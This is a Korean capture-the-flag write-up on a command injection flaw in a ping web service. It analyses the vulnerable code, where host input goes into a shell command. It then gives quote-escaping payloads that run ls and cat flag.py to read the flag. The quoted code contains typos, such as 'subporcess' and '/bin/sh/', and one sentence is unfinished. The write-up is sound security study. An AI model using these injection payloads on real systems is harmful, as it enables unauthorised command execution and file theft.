# Command Injection

## 문제 설명

웹 페이지에서 Host(IP)를 입력하면 서버에서 ping 명령을 실행하여 결과를 출력하는 서비스이다.
사용자가 입력한 Host 값이 서버에서 어떻게 처리되는지 분석하여 Command Injection을 통해 Flag 획득하는 것이 목표
  

---

## 관련 개념

### Command Injection

사용자의 입력값이 운영체제 명령어에 그대로 포함되어 실행되는 취약점


### /bin/sh

쉘 프로그램
  -쉘은 문자열 헝태여의 명령어를 해석하여 운영체제에서 실행하는 역할

---

## 코드 분석

### 사용자 입력 값

`host = request.form.get("host")`

사용자가 입력한 Host 값을 가져옴


### ping 명령어

`cmd = f'ping -c 3 "{host}"'`

사용자의 입력을 이용해 ping 명령어 만듬


### /bin/sh 

`output = subporcess.check_output(['/bin/sh/', '-c', cmd])`

여기서 만들어진 cmd 문자열을 /bin/sh가 실행
실행결과는 output 변수에 저장되고 웹 페이지에 출력

<실행 흐름>
사용자 입력

↓

host 변수 저장

↓

cmd 문자열 생성

↓

/bin/sh -c cmd 실행

↓

실행결과(output) 반환

---

## 취약점 분석

`cmd = f'ping -c 3 "{host}"'`

 - 사용자가 입력한 내용이 그대로 명령어에 들어

---

## 문제 풀이

1. 8.8.8.8"; ls; echo " 입력
  or 8.8.8.8"; ls; # 입력
2. 실제로 ping -c 3 "8.8.8.8"; ls; echo "" 실행
  or ping -c 3 "8.8.8.8"; ls; #" 실행
3. flag.py 파일 확인
4. 8.8.8.8"; cat flag.py; # 입력
5. Flag 획득

---


## 배운 점

- /bin/sh 역할
- # 주석처리 
- echo 명령어: 뒤에 적은 내용 화면에 출력
